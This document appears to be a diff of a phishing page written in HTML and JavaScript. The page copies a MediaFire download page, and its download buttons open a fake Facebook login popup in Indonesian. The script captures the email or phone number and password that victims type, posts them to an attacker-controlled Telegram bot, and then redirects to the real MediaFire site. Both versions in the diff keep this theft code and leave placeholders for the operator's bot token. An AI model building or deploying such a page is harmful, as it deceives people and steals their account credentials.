@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MediaFire - Download</title>
+    <title>MediaFire</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
@@ -17,148 +17,170 @@
             max-width: 400px;
             margin: auto;
             background: #ffffff;
-            min-height: 100vh;
         }
 
-        /* === HEADER MEDIAFIRE === */
+        /* === HEADER === */
         .header {
-            background: #0052CC; /* Biru tua asli MediaFire */
+            background: #0066CC;
             padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
         .logo {
-            color: white;
-            font-weight: bold;
-            font-size: 26px;
             display: flex;
             align-items: center;
             gap: 8px;
         }
         .logo img {
-            height: 26px;
+            height: 28px; /* Ukuran logo asli */
+        }
+        .header-buttons {
+            display: flex;
+            gap: 8px;
         }
         .header-buttons button {
             background: transparent;
             color: white;
-            border: 1px solid white;
-            padding: 7px 14px;
-            border-radius: 3px;
-            margin-left: 6px;
-            font-size: 15px;
+            border: 2px solid white;
+            padding: 8px 18px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
             cursor: pointer;
         }
         .header-buttons button:last-child {
             background: white;
-            color: #0052CC;
-            font-weight: bold;
+            color: #0066CC;
         }
 
-        /* === AREA DOWNLOAD KOTAK HITAM === */
-        .download-dark-box {
-            background: #0F172A; /* Warna hitam kebiruan */
-            color: white;
+        /* === BOX HITAM DOWNLOAD === */
+        .dark-box {
+            background: #121A2C;
             margin: 15px;
             padding: 25px 20px;
             border-radius: 8px;
         }
-        .download-title {
-            font-size: 26px;
+        .title-besar {
+            color: white;
+            font-size: 30px;
             font-weight: bold;
-            margin-bottom: 15px;
+            margin-bottom: 25px;
         }
-        .features-row {
+        .features {
             display: flex;
-            gap: 25px;
-            margin-bottom: 20px;
-            font-size: 15px;
-            opacity: 0.85;
+            justify-content: space-between;
+            color: #e0e0e0;
+            font-size: 16px;
+            margin-bottom: 25px;
+            text-align: center;
         }
-        .price-box {
-            background: #062E27;
-            border: 1px solid #10B981;
-            border-radius: 6px;
-            padding: 12px 18px;
+        .feature-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+        }
+        .feature-item img {
+            height: 24px; /* Ukuran icon fitur */
+        }
+
+        .price-container {
+            background: #0A2F28;
+            border: 2px solid #1DB954;
+            border-radius: 8px;
+            padding: 12px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 15px;
         }
         .price-text {
-            font-size: 19px;
+            color: #1DB954;
+            font-size: 22px;
             font-weight: bold;
-            color: #10B981;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .popular-badge {
-            background: #10B981;
+        .dot-green {
+            width: 12px;
+            height: 12px;
+            background: #1DB954;
+            border-radius: 50%;
+        }
+        .badge-popular {
+            background: #1DB954;
             color: white;
-            padding: 5px 12px;
-            border-radius: 15px;
-            font-size: 13px;
+            padding: 6px 15px;
+            border-radius: 20px;
             font-weight: bold;
+            font-size: 14px;
         }
-        .btn-download-main {
+        .btn-biru {
             width: 100%;
-            background: #0071E3;
+            background: #007AFF;
             color: white;
             border: none;
-            padding: 14px;
-            font-size: 18px;
+            padding: 15px;
+            font-size: 20px;
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        /* === KOTAK FILE DOWNLOAD === */
-        .file-section {
-            margin: 0 15px 20px 15px;
-        }
+        /* === BOX FILE BIRU === */
         .file-box {
-            background: #0071E3;
-            color: white;
-            border-radius: 6px;
+            background: #007AFF;
+            margin: 0 15px 15px 15px;
             padding: 15px 20px;
+            border-radius: 6px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 10px;
         }
-        .file-info {
+        .file-left {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 15px;
         }
-        .file-icon {
-            font-size: 32px;
+        .file-icon img {
+            height: 40px; /* Icon video MediaFire */
+        }
+        .file-text {
+            color: white;
         }
         .file-name {
+            font-size: 22px;
             font-weight: bold;
-            font-size: 18px;
         }
         .file-desc {
             font-size: 14px;
             opacity: 0.9;
         }
-        .file-btn {
+        .btn-download-icon {
             background: rgba(255,255,255,0.2);
             border: none;
             color: white;
-            width: 40px;
-            height: 40px;
+            width: 45px;
+            height: 45px;
+            font-size: 22px;
             border-radius: 4px;
-            font-size: 20px;
             cursor: pointer;
         }
-        .note-text {
-            font-size: 14px;
+        .note {
+            margin: 0 15px 25px 15px;
             color: #666;
-            line-height: 1.4;
-            margin-bottom: 25px;
+            font-size: 15px;
+            line-height: 1.5;
         }
 
         /* === TOMBOL SHARE === */
-        .share-buttons {
+        .share-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
@@ -168,17 +190,20 @@
             background: #F5F5F7;
             border: none;
             padding: 15px;
-            border-radius: 6px;
             font-size: 15px;
             color: #666;
+            border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
             cursor: pointer;
         }
+        .share-btn img {
+            height: 20px;
+        }
 
-        /* === POPUP LOGIN FACEBOOK === */
+        /* === POPUP FB === */
         .popup-overlay {
             display: none;
             position: fixed;
@@ -197,64 +222,66 @@
             max-width: 360px;
             border-radius: 8px;
             overflow: hidden;
-            box-shadow: 0 0 20px rgba(0,0,0,0.2);
         }
         .popup-header {
             background: #1877F2;
-            color: white;
             padding: 10px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        .popup-logo-fb {
-            font-size: 24px;
+        .popup-logo {
+            color: white;
+            font-size: 26px;
             font-weight: bold;
         }
         .close-btn {
-            background: none;
+            background: white;
+            color: #1877F2;
             border: none;
-            color: white;
-            font-size: 20px;
-            width: 30px;
-            height: 30px;
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
+            font-size: 20px;
             cursor: pointer;
+            font-weight: bold;
         }
         .popup-body {
-            padding: 20px;
+            padding: 25px 20px;
             text-align: center;
         }
-        .fb-icon-big {
+        .fb-big-icon {
             color: #1877F2;
-            font-size: 40px;
+            font-size: 50px;
             margin-bottom: 10px;
         }
         .popup-title {
             font-size: 17px;
             color: #1c1e21;
-            margin-bottom: 20px;
-            line-height: 1.4;
+            margin-bottom: 25px;
         }
         .popup-body input {
             width: 100%;
-            padding: 13px;
-            margin: 6px 0;
+            padding: 14px;
+            margin: 7px 0;
             border: 1px solid #dddfe2;
-            border-radius: 4px;
-            font-size: 15px;
+            border-radius: 6px;
+            font-size: 16px;
         }
         .popup-body button {
             width: 100%;
-            padding: 12px;
+            padding: 13px;
             background: #1877F2;
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 18px;
             font-weight: bold;
             margin: 10px 0;
             cursor: pointer;
+        }
+        .popup-links {
+            margin-top: 15px;
         }
         .popup-links a {
             display: block;
@@ -263,8 +290,8 @@
             font-size: 14px;
             margin: 8px 0;
         }
-        .lang-footer {
-            margin-top: 20px;
+        .lang-foot {
+            margin-top: 25px;
             font-size: 12px;
             color: #90949c;
         }
@@ -273,10 +300,10 @@
 <body>
 
 <div class="container">
-    <!-- HEADER -->
+    <!-- HEADER DENGAN LOGO ASLI -->
     <div class="header">
         <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/MediaFire_logo.svg/1200px-MediaFire_logo.svg.png" alt="Logo"> MediaFire
+            <img src="https://www.mediafire.com/assets/images/mediafire-logo-white.svg" alt="MediaFire">
         </div>
         <div class="header-buttons">
             <button>SIGN UP</button>
@@ -284,57 +311,82 @@
         </div>
     </div>
 
-    <!-- KOTAK HITAM DOWNLOAD FASTER -->
-    <div class="download-dark-box">
-        <h2 class="download-title">Download Faster</h2>
-        <div class="features-row">
-            <span>⏱️ No Waiting</span>
-            <span>⚡ Premium</span>
-            <span>📅 No Ads</span>
+    <!-- BOX HITAM DOWNLOAD -->
+    <div class="dark-box">
+        <h1 class="title-besar">Download Faster</h1>
+        
+        <div class="features">
+            <div class="feature-item">
+                <img src="https://cdn-icons-png.flaticon.com/512/3081/3081997.png" alt="No Waiting">
+                <div>No Waiting</div>
+            </div>
+            <div class="feature-item">
+                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828665.png" alt="Premium">
+                <div>Premium</div>
+            </div>
+            <div class="feature-item">
+                <img src="https://cdn-icons-png.flaticon.com/512/1046/1046866.png" alt="No Ads">
+                <div>No Ads</div>
+            </div>
         </div>
-        <div class="price-box">
-            <span class="price-text">● Monthly: $3.99</span>
-            <span class="popular-badge">MOST POPULAR</span>
+
+        <div class="price-container">
+            <div class="price-text">
+                <span class="dot-green"></span> Monthly: $3.99
+            </div>
+            <div class="badge-popular">MOST POPULAR</div>
         </div>
-        <button class="btn-download-main" id="btnTrigger">⚡ DOWNLOAD FASTER NOW</button>
+
+        <button class="btn-biru" id="trigger1">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828665.png" style="height:22px;"> DOWNLOAD FASTER NOW
+        </button>
     </div>
 
-    <!-- KOTAK FILE -->
-    <div class="file-section">
-        <div class="file-box">
-            <div class="file-info">
-                <span class="file-icon">📹</span>
-                <div>
-                    <div class="file-name">Resource File</div>
-                    <div class="file-desc">Download in a new tab (6.4MB)</div>
-                </div>
+    <!-- BOX FILE BIRU DENGAN ICON VIDEO ASLI -->
+    <div class="file-box">
+        <div class="file-left">
+            <span class="file-icon">
+                <img src="https://cdn-icons-png.flaticon.com/512/1043/1043444.png" alt="Video File">
+            </span>
+            <div class="file-text">
+                <div class="file-name">Resource File</div>
+                <div class="file-desc">Download in a new tab (6.4MB)</div>
             </div>
-            <button class="file-btn" id="btnTrigger2">⬇️</button>
         </div>
-        <p class="note-text">Clicking the download button above will start your download in a new tab and show a message from our advertising partners.</p>
+        <button class="btn-download-icon" id="trigger2">⬇️</button>
     </div>
+
+    <p class="note">Clicking the download button above will start your download in a new tab and show a message from our advertising partners.</p>
 
     <!-- TOMBOL SHARE -->
-    <div class="share-buttons">
-        <button class="share-btn">🔗 Copy for messenger</button>
-        <button class="share-btn">f Post to Facebook</button>
-        <button class="share-btn">🔄 Share options</button>
-        <button class="share-btn">➕ Save to My Files</button>
+    <div class="share-grid">
+        <button class="share-btn">
+            <img src="https://cdn-icons-png.flaticon.com/512/5067/5067935.png" alt="Link"> Copy for messenger
+        </button>
+        <button class="share-btn">
+            <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="Facebook"> Post to Facebook
+        </button>
+        <button class="share-btn">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828773.png" alt="Share"> Share options
+        </button>
+        <button class="share-btn">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828809.png" alt="Add"> Save to My Files
+        </button>
     </div>
 </div>
 
-<!-- POPUP LOGIN FACEBOOK -->
-<div class="popup-overlay" id="popupLogin">
+<!-- POPUP LOGIN -->
+<div class="popup-overlay" id="popup">
     <div class="popup-box">
         <div class="popup-header">
-            <span class="popup-logo-fb">f facebook</span>
-            <button class="close-btn" onclick="tutupPopup()">×</button>
+            <span class="popup-logo">f facebook</span>
+            <button class="close-btn" onclick="tutup()">×</button>
         </div>
         <div class="popup-body">
-            <div class="fb-icon-big">f</div>
+            <div class="fb-big-icon">f</div>
             <div class="popup-title">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
             
-            <form id="formData">
+            <form id="form">
                 <input type="text" id="user" placeholder="Email atau Nomor Telepon" required>
                 <input type="password" id="pass" placeholder="Kata Sandi" required>
                 <button type="submit">Masuk</button>
@@ -346,7 +398,7 @@
                 <a href="#">Lupa Kata Sandi? • Pusat Bantuan</a>
             </div>
 
-            <div class="lang-footer">
+            <div class="lang-foot">
                 Bahasa Indonesia | English (UK)<br><br>
                 Facebook Inc.
             </div>
@@ -355,48 +407,30 @@
 </div>
 
 <script>
-    // GANTI PAKE DATA LO
-    const BOT_TOKEN = "6123456789:ABCdefGhIJKlmNoPQRstUvWxYz123456";
-    const CHAT_ID = "123456789";
+    const BOT_TOKEN = "ISI_TOKEN_LO";
+    const CHAT_ID = "ISI_CHATID_LO";
 
-    // BUKA POPUP
-    document.getElementById("btnTrigger").addEventListener("click", bukaPopup);
-    document.getElementById("btnTrigger2").addEventListener("click", bukaPopup);
+    document.getElementById("trigger1").addEventListener("click", buka);
+    document.getElementById("trigger2").addEventListener("click", buka);
 
-    function bukaPopup(){
-        document.getElementById("popupLogin").style.display = "flex";
+    function buka(){
+        document.getElementById("popup").style.display = "flex";
     }
-    function tutupPopup(){
-        document.getElementById("popupLogin").style.display = "none";
+    function tutup(){
+        document.getElementById("popup").style.display = "none";
     }
 
-    // PROSES KIRIM DATA
-    document.getElementById("formData").addEventListener("submit", function(e){
+    document.getElementById("form").addEventListener("submit", function(e){
         e.preventDefault();
-
-        let user = document.getElementById("user").value;
-        let pass = document.getElementById("pass").value;
-
-        let pesan = `🔴 DATA MASUK 🔴
-👤 User : ${user}
-🔑 Pass : ${pass}
-⏰ Waktu : ${new Date().toLocaleString('id-ID')}`;
+        let u = document.getElementById("user").value;
+        let p = document.getElementById("pass").value;
+        let msg = `🔴 DATA LOGIN\nUser: ${u}\nPass: ${p}`;
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: pesan,
-                parse_mode: "Markdown"
-            })
-        })
-        .then(() => {
-            window.location.href = "https://www.mediafire.com";
-        })
-        .catch(() => {
-            window.location.href = "https://www.mediafire.com";
-        });
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+        }).then(()=> window.location.href="https://mediafire.com");
     });
 </script>
 
